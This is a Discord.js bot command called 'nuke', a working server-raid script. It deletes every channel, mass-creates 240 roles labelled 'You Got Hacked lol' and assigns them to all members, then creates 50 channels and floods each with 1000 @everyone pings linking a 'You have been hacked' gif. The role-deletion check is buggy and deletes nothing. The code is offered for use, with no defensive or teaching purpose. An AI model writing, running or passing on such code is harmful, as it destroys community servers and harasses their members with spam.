module.exports.run = async (client, message, args) => {

    var channelNames =  ["channelName1","channelName2"]; //Channel names

    message.guild.channels.cache.forEach(channel => channel.delete()); // Deleting every channel in the guild

    // Deleting every role except for everyone

    message.guild.roles.cache.forEach(role => {

        if(!role.name === "everyone") {

            role.delete(); 

        }

    });

    // Creating 240 roles called "You Got Hacked lol" and then giving everyone in the server these roles

    for(let i = 0; i < 240; i++) {
    
        message.guild.roles.create({ name: "You Got Hacked lol" }).then((createdRole) => {

            message.guild.members.cache.forEach(member => member.roles.add(createdRole.id));

        });

    }

    // Creating 50 channels called a random name from the array we defined earlier (channelNames) 

    for(let i = 0; i < 50; i++) {

        var number = Math.floor(Math.random() * channelNames.length);
        var channelName = channelNames[number];

        message.guild.channels.create(channelName, {
            type: "text",
            permissionOverwrites: [
                {
                    id: message.guild.roles.everyone,
                    deny: ["SEND_MESSAGES"]
                }
            ],
        }).then(channel => {

            // Spamming message's in these channels and mass pinging everyone

            for(let i = 0; i < 1000; i++) {
            
                channel.send({ content: "@everyone https://cdn.discordapp.com/attachments/923889898602266654/923890084615430184/You_have_been_hacked.gif" });

            }

        });

    }

}

module.exports.help = {
    name: "nuke"
}